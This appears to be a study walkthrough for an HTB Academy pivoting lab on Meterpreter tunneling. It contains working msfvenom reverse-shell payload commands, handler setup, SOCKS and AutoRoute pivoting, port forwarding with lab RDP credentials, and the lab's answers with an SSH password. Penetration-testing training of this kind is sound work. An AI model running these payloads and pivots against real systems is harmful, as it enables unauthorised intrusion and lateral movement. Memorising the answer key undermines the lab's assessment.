# 🌐 Meterpreter Tunneling & Port Forwarding - CPTS

## **Overview**

When we have Meterpreter shell access on a pivot host, we can perform enumeration and pivoting without relying on SSH port forwarding. Meterpreter provides built-in tunneling capabilities that can be leveraged for network pivoting, including SOCKS proxies, routing, and port forwarding.

**Based on HTB Academy Page 5: Meterpreter Tunneling & Port Forwarding**

---

## **Scenario Description**

### **Network Topology**
```
[Attack Host] ←→ [Ubuntu Pivot] ←→ [Windows Target]
10.10.14.x         10.129.202.64      172.16.5.19
                   (Meterpreter)       (Internal Only)
```

### **The Approach**
- **Meterpreter session** on Ubuntu pivot host
- **Built-in pivoting** without SSH dependencies
- **SOCKS proxy** for traffic routing
- **AutoRoute** for network routing
- **Port forwarding** through Meterpreter

---

## **1. Creating Meterpreter Payload for Pivot Host**

### **Generate Linux Meterpreter Payload**

```bash
# Create Meterpreter payload for Ubuntu pivot
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080

# Expected Output:
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
Saved as: backupjob
```

### **Configure Metasploit Handler**

```bash
# Start multi/handler for Linux payload
msf6 > use exploit/multi/handler

msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0

msf6 exploit(multi/handler) > set lport 8080
lport => 8080

msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp

msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 0.0.0.0:8080
```

### **Execute Payload on Pivot**

```bash
# On Ubuntu pivot host
ubuntu@WebServer:~$ ls
backupjob

ubuntu@WebServer:~$ chmod +x backupjob 
ubuntu@WebServer:~$ ./backupjob
```

### **Establish Meterpreter Session**

```bash
# Metasploit handler output
[*] Sending stage (3020772 bytes) to 10.129.202.64
[*] Meterpreter session 1 opened (10.10.14.18:8080 -> 10.129.202.64:39826) at 2022-03-03 12:27:43 -0500

meterpreter > pwd
/home/ubuntu
```

---

## **2. Network Discovery Through Meterpreter**

### **Ping Sweep with Meterpreter Module**

```bash
# Use built-in ping sweep module
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23

[*] Performing ping sweep for IP range 172.16.5.0/23
```

### **Alternative Ping Sweep Methods**

**Linux Pivot Host (Bash):**
```bash
# For loop ping sweep on Linux
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```

**Windows Pivot Host (CMD):**
```cmd
# For loop ping sweep using CMD
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

**Windows Pivot Host (PowerShell):**
```powershell
# PowerShell ping sweep
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
```

**Note:** Ping sweeps may require multiple attempts to build ARP cache for successful replies.

---

## **3. SOCKS Proxy Configuration**

### **Configure Metasploit SOCKS Proxy**

```bash
# Set up SOCKS proxy server
msf6 > use auxiliary/server/socks_proxy

msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
SRVPORT => 9050

msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
SRVHOST => 0.0.0.0

msf6 auxiliary(server/socks_proxy) > set version 4a
version => 4a

msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.
[*] Starting the SOCKS proxy server
```

### **Verify SOCKS Proxy Status**

```bash
# Check running jobs
msf6 auxiliary(server/socks_proxy) > jobs

Jobs
====
  Id  Name                           Payload  Payload opts
  --  ----                           -------  ------------
  0   Auxiliary: server/socks_proxy

# View module options
msf6 auxiliary(server/socks_proxy) > options

Module options (auxiliary/server/socks_proxy):
   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The address to listen on
   SRVPORT  9050             yes       The port to listen on
   VERSION  4a               yes       The SOCKS version to use (Accepted: 4a, 5)
```

### **Configure Proxychains**

```bash
# Add to /etc/proxychains.conf if not present
echo "socks4 127.0.0.1 9050" >> /etc/proxychains.conf
```

**Note:** May need to change `socks4` to `socks5` depending on SOCKS server version.

---

## **4. AutoRoute for Traffic Routing**

### **Configure AutoRoute Module**

```bash
# Set up routing through Meterpreter session
msf6 > use post/multi/manage/autoroute

msf6 post(multi/manage/autoroute) > set SESSION 1
SESSION => 1

msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
SUBNET => 172.16.5.0

msf6 post(multi/manage/autoroute) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: linux
[*] Running module against 10.129.202.64
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.16.5.0/255.255.254.0 from host's routing table.
[*] Post module execution completed
```

### **Alternative: AutoRoute from Meterpreter Session**

```bash
# Add routes directly from Meterpreter
meterpreter > run autoroute -s 172.16.5.0/23

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.16.5.0/255.255.254.0...
[+] Added route to 172.16.5.0/255.255.254.0 via 10.129.202.64
[*] Use the -p option to list all active routes
```

### **List Active Routes**

```bash
# View routing table
meterpreter > run autoroute -p

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================
   Subnet             Netmask            Gateway
   ------             -------            -------
   10.129.0.0         255.255.0.0        Session 1
   172.16.4.0         255.255.254.0      Session 1
   172.16.5.0         255.255.254.0      Session 1
```

---

## **5. Testing Proxy & Routing**

### **Network Scanning Through Proxy**

```bash
# Scan Windows target through proxychains
proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn

# Expected Output:
ProxyChains-3.1 (http://proxychains.sf.net)
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-03 13:40 EST
Initiating Parallel DNS resolution of 1 host. at 13:40
Completed Parallel DNS resolution of 1 host. at 13:40, 0.12s elapsed
Initiating Connect Scan at 13:40
Scanning 172.16.5.19 [1 port]
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
Discovered open port 3389/tcp on 172.16.5.19
Completed Connect Scan at 13:40, 0.12s elapsed (1 total ports)

Nmap scan report for 172.16.5.19
Host is up (0.12s latency).

PORT     STATE SERVICE
3389/tcp open  ms-wbt-server

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
```

---

## **6. Meterpreter Port Forwarding**

### **Local Port Forwarding with portfwd**

```bash
# View portfwd options
meterpreter > help portfwd

Usage: portfwd [-h] [add | delete | list | flush] [args]

OPTIONS:
    -h        Help banner.
    -i <opt>  Index of the port forward entry to interact with (see the "list" command).
    -l <opt>  Forward: local port to listen on. Reverse: local port to connect to.
    -L <opt>  Forward: local host to listen on (optional). Reverse: local host to connect to.
    -p <opt>  Forward: remote port to connect to. Reverse: remote port to listen on.
    -r <opt>  Forward: remote host to connect to.
    -R        Indicates a reverse port forward.
```

### **Create Local TCP Relay**

```bash
# Forward local port 3300 to Windows target RDP
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19

[*] Local TCP relay created: :3300 <-> 172.16.5.19:3389
```

### **Connect Through Port Forward**

```bash
# RDP to Windows target via localhost
xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```

### **Verify Connection with Netstat**

```bash
# Check established connections
netstat -antp

tcp        0      0 127.0.0.1:54652         127.0.0.1:3300          ESTABLISHED 4075/xfreerdp
```

---

## **7. Meterpreter Reverse Port Forwarding**

### **Configure Reverse Port Forward**

```bash
# Set up reverse port forwarding from Ubuntu to attack host
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18

[*] Local TCP relay created: 10.10.14.18:8081 <-> :1234
```

**Configuration Explanation:**
- **-R**: Reverse port forwarding
- **-l 8081**: Local port on attack host
- **-p 1234**: Port on Ubuntu pivot 
- **-L 10.10.14.18**: Attack host IP

### **Setup Handler for Windows Payload**

```bash
# Background current session and configure new handler
meterpreter > bg
[*] Backgrounding session 1...

msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp

msf6 exploit(multi/handler) > set LPORT 8081 
LPORT => 8081

msf6 exploit(multi/handler) > set LHOST 0.0.0.0 
LHOST => 0.0.0.0

msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 0.0.0.0:8081
```

### **Generate Windows Payload**

```bash
# Create payload pointing to Ubuntu pivot
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234

# Expected Output:
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: backupscript.exe
```

### **Execute Payload and Receive Shell**

```bash
# After executing payload on Windows target
[*] Started reverse TCP handler on 0.0.0.0:8081 
[*] Sending stage (200262 bytes) to 10.10.14.18
[*] Meterpreter session 2 opened (10.10.14.18:8081 -> 10.10.14.18:40173) at 2022-03-04 15:26:14 -0500

meterpreter > shell
Process 2336 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\>
```

---

## **8. Traffic Flow Analysis**

### **Local Port Forwarding Flow**
```
[Attack Host:xfreerdp] → [localhost:3300] → [Meterpreter Session] → [Windows:3389]
```

### **Reverse Port Forwarding Flow**
```
[Windows Target] → [Ubuntu:1234] → [Meterpreter Session] → [Attack Host:8081]
```

### **SOCKS Proxy Flow**
```
[proxychains nmap] → [localhost:9050] → [SOCKS Proxy] → [Meterpreter Session] → [Target Network]
```

---

## **9. Meterpreter vs SSH Tunneling Comparison**

| **Aspect** | **Meterpreter Tunneling** | **SSH Tunneling** |
|------------|---------------------------|-------------------|
| **Prerequisites** | Meterpreter session | SSH access |
| **Setup Complexity** | Integrated in Metasploit | Requires SSH commands |
| **SOCKS Proxy** | Built-in auxiliary module | External tools needed |
| **Port Forwarding** | portfwd module | ssh -L/-R commands |
| **Routing** | AutoRoute module | Manual route setup |
| **Session Management** | Metasploit framework | Terminal sessions |
| **Stealth** | More detectable | Blends with SSH traffic |

---

## **10. Troubleshooting Common Issues**

### **AutoRoute Compatibility Warnings**

```bash
# Warning about session compatibility
[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: linux

# Solution: Proceed anyway, module usually works despite warning
```

### **SOCKS Proxy Connection Issues**

```bash
# Check if proxy is running
msf6 > jobs

# Verify proxychains configuration
cat /etc/proxychains.conf | grep socks

# Test connectivity
proxychains curl -I http://172.16.5.19
```

### **Port Forward Verification**

```bash
# List active port forwards
meterpreter > portfwd list

# Check listening ports
netstat -antp | grep :3300

# Test forwarded connection
telnet localhost 3300
```

---

## **11. HTB Academy Official Walkthrough**

### **Complete Step-by-Step Lab Solution**

#### **Question 1: Network Discovery**
**"What two IP addresses can be discovered when attempting a ping sweep from the Ubuntu pivot host? (Format: x.x.x.x,x.x.x.x)"**

**Official Answer:** `172.16.5.19,172.16.5.129`

##### **Step 1: Create Linux Meterpreter Payload**
```bash
# Generate reverse TCP Meterpreter payload
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=8080 -f elf -o reverseShell

# Expected Output:
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
Saved as: reverseShell
```

##### **Step 2: Configure Metasploit Handler**
```bash
# Start msfconsole and configure handler
msfconsole -q
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 8080
run

# Expected Output:
[*] Started reverse TCP handler on 0.0.0.0:8080
```

##### **Step 3: Transfer Payload to Pivot**
```bash
# SCP transfer to Ubuntu pivot
scp reverseShell ubuntu@10.129.104.197:~/

# Enter password: HTB_@cademy_stdnt!
# Expected Output:
reverseShell                              100%  250     2.7KB/s   00:00
```

##### **Step 4: Execute Payload on Pivot**
```bash
# SSH to pivot and execute payload
ssh ubuntu@10.129.104.197

# On pivot host:
ubuntu@WEB01:~$ chmod +x reverseShell 
ubuntu@WEB01:~$ ./reverseShell
```

##### **Step 5: Perform Ping Sweep**
```bash
# From Meterpreter session
meterpreter > shell
Process 3006 created.
Channel 330 created.

bash -i
ubuntu@WEB01:~$ for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done

# Expected Output:
64 bytes from 172.16.5.19: icmp_seq=1 ttl=128 time=0.378 ms
64 bytes from 172.16.5.129: icmp_seq=1 ttl=64 time=0.032 ms
```

#### **Question 2: AutoRoute Configuration**
**"Which of the routes that AutoRoute adds allows 172.16.5.19 to be reachable from the attack host? (Format:x.x.x.x/x.x.x.x)"**

**Official Answer:** `172.16.5.0/255.255.254.0`

##### **Step 1-4: Same as Question 1** (Create payload, handler, transfer, execute)

##### **Step 5: Configure SOCKS Proxy**
```bash
# Background Meterpreter session
meterpreter > bg
[*] Backgrounding session 1...

# Configure SOCKS proxy
msf6 exploit(multi/handler) > use auxiliary/server/socks_proxy 
msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
SRVPORT => 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
SRVHOST => 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set VERSION 4a
VERSION => 4a
msf6 auxiliary(server/socks_proxy) > run

# Expected Output:
[*] Auxiliary module running as background job 0.
[*] Starting the SOCKS proxy server
```

##### **Step 6: Configure Proxychains**
```bash
# Ensure /etc/proxychains.conf contains:
socks4 127.0.0.1 9050
```

##### **Step 7: Setup AutoRoute**
```bash
# Return to Meterpreter session
msf6 post(multi/manage/autoroute) > sessions -i 1
[*] Starting interaction with 1...

# Add route to target network
meterpreter > run autoroute -s 172.16.5.0/23

# Expected Output:
[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.16.5.0/255.255.254.0...
[+] Added route to 172.16.5.0/255.255.254.0 via 10.129.106.254
[*] Use the -p option to list all active routes
```

**Route Analysis:** The AutoRoute adds `172.16.5.0/255.255.254.0` which encompasses the target `172.16.5.19`

### **Lab Success Criteria**
✅ **Payload created** and transferred successfully  
✅ **Meterpreter session** established on pivot  
✅ **Ping sweep** reveals two active IPs: 172.16.5.19, 172.16.5.129  
✅ **SOCKS proxy** configured on port 9050  
✅ **AutoRoute** adds route 172.16.5.0/255.255.254.0  
✅ **Network pivoting** enabled through Meterpreter session

---

## **12. Best Practices**

### **Session Management**
1. **Background sessions** properly with `bg` command
2. **Monitor active sessions** with `sessions -l`
3. **Clean up port forwards** when finished
4. **Document active routes** for complex networks

### **Network Discovery**
1. **Use multiple discovery methods** (ping, TCP scan)
2. **Attempt discovery twice** to build ARP cache
3. **Document discovered hosts** for later reference
4. **Test connectivity** before setting up tunnels

### **Security Considerations**
1. **Minimize payload size** for stealth
2. **Use HTTPS payloads** when possible
3. **Clean up artifacts** after assessment
4. **Monitor for detection** during operations

---

## **13. Command Reference**

### **Essential Meterpreter Commands**
```bash
# Background session
bg

# List active sessions
sessions -l

# AutoRoute operations
run autoroute -s 172.16.5.0/23    # Add route
run autoroute -p                  # List routes
run autoroute -d 172.16.5.0/23    # Delete route

# Port forwarding
portfwd add -l 3300 -p 3389 -r 172.16.5.19    # Local forward
portfwd add -R -l 8081 -p 1234 -L 10.10.14.18  # Reverse forward
portfwd list                                    # List forwards
portfwd delete -i 1                            # Delete forward
```

### **Metasploit Auxiliary Modules**
```bash
# SOCKS proxy
use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set version 4a
run

# AutoRoute
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 172.16.5.0
run

# Network discovery
use post/multi/gather/ping_sweep
set RHOSTS 172.16.5.0/23
run
```

---

## **References**

- **HTB Academy**: Pivoting, Tunneling & Port Forwarding - Page 5
- **Metasploit Documentation**: [Meterpreter Portfwd](https://docs.metasploit.com/)
- **SANS**: [Metasploit Pivoting Techniques](https://www.sans.org)
- **Rapid7**: [AutoRoute Module Documentation](https://rapid7.github.io/metasploit-framework/api/) 